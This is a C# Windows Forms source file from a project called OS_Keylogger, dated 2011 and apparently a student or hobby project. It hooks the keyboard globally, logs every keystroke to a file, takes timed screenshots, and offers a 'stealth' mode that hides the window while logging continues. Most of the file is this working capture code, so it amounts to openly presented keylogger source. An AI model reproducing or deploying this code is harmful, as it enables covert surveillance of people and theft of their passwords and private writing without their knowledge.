/*
 *  formMain.cs
 *  
 *  Audie Sumaray
 *  Eric Hacecky
 *  
 *  12/3/11
 *  
 */

using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Timers;

namespace OS_Keylogger
{
    public partial class formMain : Form
    {
        private int searchStart = 0;
        private string searchWord = "";
        private System.Timers.Timer screenshotTimer = new System.Timers.Timer();

        public formMain()
        {
            InitializeComponent();
        }

        /**
         * Disable start button, enable stop button, and create keyboard hook.
         **/
        private void btnStart_Click(object sender, EventArgs e)
        {
            if (OS_Keylogger.Properties.Settings.Default.screenCap)
            {
                screenshotTimer.Interval = OS_Keylogger.Properties.Settings.Default.screenInterval * 1000;
                screenshotTimer.Elapsed += new ElapsedEventHandler(ScreenshotEvent);
                screenshotTimer.Start();
            }

            if (OS_Keylogger.Properties.Settings.Default.logFile == "")
            {
                dialogSaveFile.ShowDialog();
                string saveFile = dialogSaveFile.FileName;
                OS_Keylogger.Properties.Settings.Default.logFile = saveFile;
            }

            btnStop.Enabled = true;
            btnStart.Enabled = false;
            Keyhook.CreateHook(KeyParser);
        }

        /**
         * Take a screen capture over a set interval, save the screenshot
         * with filename equal to the current time
         **/
        public static void ScreenshotEvent(object source, ElapsedEventArgs e)
        {
            string time = DateTime.Now.ToString("hh-mm-ss");
            ScreenShotDemo.ScreenCapture screenCap = new ScreenShotDemo.ScreenCapture();
            Image screenImg = screenCap.CaptureScreen();
            string capfile = OS_Keylogger.Properties.Settings.Default.screenDirectory
                + "\\" + time + ".jpg";
            screenCap.CaptureScreenToFile(capfile, System.Drawing.Imaging.ImageFormat.Jpeg);
        }

        /**
         *  Enable start button, disable stop, destroy keyboard hook, and
         *  refresh text display
         **/  
        private void btnStop_Click(object sender, EventArgs e)
        {
            if (OS_Keylogger.Properties.Settings.Default.screenCap)
            {
                screenshotTimer.Stop();
            }
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            Keyhook.DestroyHook();
            txtMain.Text = System.IO.File.ReadAllText(
                OS_Keylogger.Properties.Settings.Default.logFile);
        }

        /**
         * Parse keys pressed and write them to log file.
         **/
        private void KeyParser(IntPtr wParam, IntPtr lParam)
        {
            TextWriter tw = new StreamWriter(
                OS_Keylogger.Properties.Settings.Default.logFile, true);

            int inKey = Marshal.ReadInt32(lParam);
            Keyhook.Key escapeKey = (Keyhook.Key)OS_Keylogger.Properties.Settings.Default.hotkey;
            Keyhook.Key key = (Keyhook.Key)inKey;
            string delim = OS_Keylogger.Properties.Settings.Default.logDelimeter;

            if (key == escapeKey)
            {
                btnStart.Enabled = true;
                btnStop.Enabled = false;
                Keyhook.DestroyHook();
                tw.Close();
                txtMain.Text = System.IO.File.ReadAllText(
                    OS_Keylogger.Properties.Settings.Default.logFile);
                this.Show();
            }

            if (key == Keyhook.Key.VK_0)

                tw.Write("0" + delim);

            if (key == Keyhook.Key.VK_1)

                tw.Write("1" + delim);

            if (key == Keyhook.Key.VK_2)

                tw.Write("2" + delim);

            if (key == Keyhook.Key.VK_3)

                tw.Write("3" + delim);

            if (key == Keyhook.Key.VK_4)

                tw.Write("4" + delim);

            if (key == Keyhook.Key.VK_5)

                tw.Write("5" + delim);

            if (key == Keyhook.Key.VK_6)

                tw.Write("6" + delim);

            if (key == Keyhook.Key.VK_7)

                tw.Write("7" + delim);

            if (key == Keyhook.Key.VK_8)

                tw.Write("8" + delim);

            if (key == Keyhook.Key.VK_9)

                tw.Write("9" + delim);

            if (key == Keyhook.Key.VK_A)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("A" + delim);
                }
                else
                {
                    tw.Write("a" + delim);
                }
            }

            if (key == Keyhook.Key.VK_B)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("B" + delim);
                }
                else
                {
                    tw.Write("b" + delim);
                }
            }

            if (key == Keyhook.Key.VK_C)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("C" + delim);
                }
                else
                {
                    tw.Write("c" + delim);
                }
            }

            if (key == Keyhook.Key.VK_D)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("D" + delim);
                }
                else
                {
                    tw.Write("d" + delim);
                }
            }

            if (key == Keyhook.Key.VK_E)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("E" + delim);
                }
                else
                {
                    tw.Write("e" + delim);
                }
            }

            if (key == Keyhook.Key.VK_F)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("F" + delim);
                }
                else
                {
                    tw.Write("f" + delim);
                }
            }

            if (key == Keyhook.Key.VK_G)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("G" + delim);
                }
                else
                {
                    tw.Write("g" + delim);
                }
            }

            if (key == Keyhook.Key.VK_H)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("H" + delim);
                }
                else
                {
                    tw.Write("h" + delim);
                }
            }

            if (key == Keyhook.Key.VK_I)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("I" + delim);
                }
                else
                {
                    tw.Write("i" + delim);
                }
            }

            if (key == Keyhook.Key.VK_J)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("J" + delim);
                }
                else
                {
                    tw.Write("j" + delim);
                }
            }

            if (key == Keyhook.Key.VK_K)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("K" + delim);
                }
                else
                {
                    tw.Write("k" + delim);
                }
            }

            if (key == Keyhook.Key.VK_L)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("L" + delim);
                }
                else
                {
                    tw.Write("l" + delim);
                }
            }

            if (key == Keyhook.Key.VK_M)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("M" + delim);
                }
                else
                {
                    tw.Write("m" + delim);
                }
            }

            if (key == Keyhook.Key.VK_N)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("N" + delim);
                }
                else
                {
                    tw.Write("n" + delim);
                }
            }

            if (key == Keyhook.Key.VK_O)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("O" + delim);
                }
                else
                {
                    tw.Write("o" + delim);
                }
            }

            if (key == Keyhook.Key.VK_P)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("P" + delim);
                }
                else
                {
                    tw.Write("p" + delim);
                }
            }

            if (key == Keyhook.Key.VK_Q)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("Q" + delim);
                }
                else
                {
                    tw.Write("q" + delim);
                }
            }

            if (key == Keyhook.Key.VK_R)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("R" + delim);
                }
                else
                {
                    tw.Write("r" + delim);
                }
            }

            if (key == Keyhook.Key.VK_S)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("S" + delim);
                }
                else
                {
                    tw.Write("s" + delim);
                }
            }

            if (key == Keyhook.Key.VK_T)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("T" + delim);
                }
                else
                {
                    tw.Write("t" + delim);
                }
            }

            if (key == Keyhook.Key.VK_U)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("U" + delim);
                }
                else
                {
                    tw.Write("u" + delim);
                }
            }

            if (key == Keyhook.Key.VK_V)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("V" + delim);
                }
                else
                {
                    tw.Write("v" + delim);
                }
            }

            if (key == Keyhook.Key.VK_W)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("W" + delim);
                }
                else
                {
                    tw.Write("w" + delim);
                }
            }

            if (key == Keyhook.Key.VK_X)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("X" + delim);
                }
                else
                {
                    tw.Write("x" + delim);
                }
            }

            if (key == Keyhook.Key.VK_Y)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("Y" + delim);
                }
                else
                {
                    tw.Write("y" + delim);
                }
            }

            if (key == Keyhook.Key.VK_Z)
            {
                if (OS_Keylogger.Properties.Settings.Default.capitalize)
                {
                    tw.Write("Z" + delim);
                }
                else
                {
                    tw.Write("z" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD0)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("0" + delim);
                }
                else
                {
                    tw.Write("[NUM 0]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD1)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("1" + delim);
                }
                else
                {
                    tw.Write("[NUM 1]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD2)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("2" + delim);
                }
                else
                {
                    tw.Write("[NUM 2]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD3)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("3" + delim);
                }
                else
                {
                    tw.Write("[NUM 3]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD4)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("4" + delim);
                }
                else
                {
                    tw.Write("[NUM 4]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD5)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("5" + delim);
                }
                else
                {
                    tw.Write("[NUM 5]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD6)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("6" + delim);
                }
                else
                {
                    tw.Write("[NUM 6]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD7)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("7" + delim);
                }
                else
                {
                    tw.Write("[NUM 7]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD8)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("8" + delim);
                }
                else
                {
                    tw.Write("[NUM 8]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_NUMPAD9)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("9" + delim);
                }
                else
                {
                    tw.Write("[NUM 9]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_BACK)

                tw.Write("[BACKSPACE]" + delim);

            if (key == Keyhook.Key.VK_TAB)

                tw.Write("[TAB]" + delim);

            if (key == Keyhook.Key.VK_RETURN)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write("\r\n" + delim);
                }
                else
                {
                    tw.Write("[ENTER]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_SHIFT)

                tw.Write("[SHIFT]" + delim);

            if (key == Keyhook.Key.VK_CONTROL)

                tw.Write("[CTRL]" + delim);

            if (key == Keyhook.Key.VK_MENU)

                tw.Write("[ALT]" + delim);

            if (key == Keyhook.Key.VK_CAPITAL)

                tw.Write("[CAPS LOCK]" + delim);

            if (key == Keyhook.Key.VK_ESCAPE)

                tw.Write("[ESC]" + delim);

            if (key == Keyhook.Key.VK_SPACE)
            {
                if (OS_Keylogger.Properties.Settings.Default.textMode)
                {
                    tw.Write(" " + delim);
                }
                else
                {
                    tw.Write("[SPACE]" + delim);
                }
            }

            if (key == Keyhook.Key.VK_UP)

                tw.Write("[UP]" + delim);

            if (key == Keyhook.Key.VK_RIGHT)

                tw.Write("[RIGHT]" + delim);

            if (key == Keyhook.Key.VK_DOWN)

                tw.Write("[DOWN]" + delim);

            if (key == Keyhook.Key.VK_LEFT)

                tw.Write("[LEFT]" + delim);

            if (key == Keyhook.Key.VK_DELETE)

                tw.Write("[DEL]" + delim);

            if (key == Keyhook.Key.VK_LWIN)

                tw.Write("[WINDOWS]" + delim);

            if (key == Keyhook.Key.VK_RWIN)

                tw.Write("[WINDOWS]" + delim);

            if (key == Keyhook.Key.VK_LSHIFT)

                tw.Write("[SHIFT]" + delim);

            if (key == Keyhook.Key.VK_RSHIFT)

                tw.Write("[SHIFT]" + delim);

            if (key == Keyhook.Key.VK_LCONTROL)

                tw.Write("[CTRL]" + delim);

            if (key == Keyhook.Key.VK_RCONTROL)

                tw.Write("[CTRL]" + delim);

            if (key == Keyhook.Key.VK_LMENU)

                tw.Write("[ALT]" + delim);

            if (key == Keyhook.Key.VK_RMENU)

                tw.Write("[ALT]" + delim);

            if (key == Keyhook.Key.VK_OEM_1)

                tw.Write(";" + delim);

            if (key == Keyhook.Key.VK_OEM_PLUS)

                tw.Write("=" + delim);

            if (key == Keyhook.Key.VK_OEM_COMMA)

                tw.Write("," + delim);

            if (key == Keyhook.Key.VK_OEM_MINUS)

                tw.Write("-" + delim);

            if (key == Keyhook.Key.VK_OEM_PERIOD)

                tw.Write("." + delim);

            if (key == Keyhook.Key.VK_OEM_2)

                tw.Write("/" + delim);

            if (key == Keyhook.Key.VK_OEM_3)

                tw.Write("`" + delim);

            if (key == Keyhook.Key.VK_OEM_4)

                tw.Write("[" + delim);

            if (key == Keyhook.Key.VK_OEM_5)

                tw.Write("\\" + delim);

            if (key == Keyhook.Key.VK_OEM_6)

                tw.Write("]");

            if (key == Keyhook.Key.VK_OEM_7)

                tw.Write("'" + delim);

            tw.Close();
        }

        /**
         * Show open dialog and open log in main text box
         **/
        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            dialogOpenFile.ShowDialog();
            if (dialogOpenFile.FileName != "")
            {
                string logToShow = dialogOpenFile.FileName;
                txtMain.Text = System.IO.File.ReadAllText(logToShow);
                OS_Keylogger.Properties.Settings.Default.logFile = logToShow;
            }
        }

        /**
         * Search through textbox and highlight where a word appears.
         * Upon subsequent clicks of find button, return the next place
         * the word is found. If the word is not found, display an alert.
         **/
        private void btnFind_Click(object sender, EventArgs e)
        {
            int searchIndex = 0;
            if (txtFind.Text != null)
            {
                int findLength = txtFind.Text.Length;
                if (txtFind.Text != searchWord)
                {
                    searchWord = txtFind.Text;
                    searchStart = 0;
                }
                searchIndex = txtMain.Text.IndexOf(searchWord, searchStart);
                if (searchIndex == -1)
                {
                    MessageBox.Show("\'" + txtFind.Text + "\'" + 
                        " could not be found.", "Not Found",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    txtMain.Select(searchIndex, findLength);
                    searchStart = searchIndex + 1;
                }
            }
        }

        /**
         * Clear the currently selected log and display an alert.
         **/
        private void clearCurrentLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string logFile = OS_Keylogger.Properties.Settings.Default.logFile;
            TextWriter tw = new StreamWriter(
                OS_Keylogger.Properties.Settings.Default.logFile);
            tw.Write("");
            tw.Close();
            MessageBox.Show("Log has been cleared", "Log Clear",
                        MessageBoxButtons.OK);
            txtMain.Text = System.IO.File.ReadAllText(
                OS_Keylogger.Properties.Settings.Default.logFile);
        }

        /**
         * Show save dialog and set save property to file
         **/
        private void newLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            dialogSaveFile.ShowDialog();
            if (dialogSaveFile.FileName != "")
            {
                string saveFile = dialogSaveFile.FileName;
                OS_Keylogger.Properties.Settings.Default.logFile = saveFile;
            }
        }

        /**
         * Exit Program
         **/
        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /**
         * Show options form
         **/
        private void configureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            formOptions options = new formOptions();
            options.Show();
        }

        /**
         * Delete the current log
         **/
        private void deleteCurrentLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Are you sure you would like to delete the current log?",
                "Delete current log?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning)
                == DialogResult.Yes)
            {
                if (OS_Keylogger.Properties.Settings.Default.logFile != "")
                {
                    FileInfo myFile = new FileInfo(
                        @OS_Keylogger.Properties.Settings.Default.logFile);
                    myFile.Delete();
                    OS_Keylogger.Properties.Settings.Default.logFile = "";
                    txtMain.Text = "";
                }
            }
        }

        /**
         * Runs the true "stealth" logger
         **/
        private void runStealthLoggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (OS_Keylogger.Properties.Settings.Default.logFile == "")
            {
                dialogSaveFile.ShowDialog();
                string saveFile = dialogSaveFile.FileName;
                OS_Keylogger.Properties.Settings.Default.logFile = saveFile;
            }
            Keyhook.CreateHook(KeyParser);
            this.Hide();
        }

        private void formMain_Load(object sender, EventArgs e)
        {
            // RegistryAccess.SetStringRegistryValue("registered", "false");
            string isRegistered = RegistryAccess.GetStringRegistryValue("registered", null);
            if (isRegistered == "true")
            {
                registerToolStripMenuItem.Visible = false;
            }
            else
            {
                registerToolStripMenuItem.Visible = true;
                runStealthLoggerToolStripMenuItem.Enabled = false;
                string msgBoxText = "We've noticed that you haven't registered your copy of "
                    + "The Logger yet. While you can continue to use it, some features"
                    + " will be disabled, such as stealth logging and screen captures."
                    + " Registering will enable these features. Would you like to"
                    + " register now?";
                string msgBoxCaption = "Please Register";
                MessageBoxButtons msgBoxButtons = MessageBoxButtons.YesNo;
                DialogResult = MessageBox.Show(msgBoxText, msgBoxCaption, msgBoxButtons);
                if (DialogResult == DialogResult.Yes)
                {
                    formRegister register = new formRegister();
                    register.Show();
                }
                else
                {
                    RegistryAccess.SetStringRegistryValue("registered", "false");
                }
            }
        }

        private void KeyGenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Keygen myKeygen = new Keygen();
            myKeygen.Show();
        }

        private void KeyGenToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Keygen myKeygen = new Keygen();
            myKeygen.Show();
        }

        private void registerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            formRegister register = new formRegister();
            register.Show();
        }

        private void btnConfigure_Click(object sender, EventArgs e)
        {
            formOptions options = new formOptions();
            options.Show();
        }
    }
}
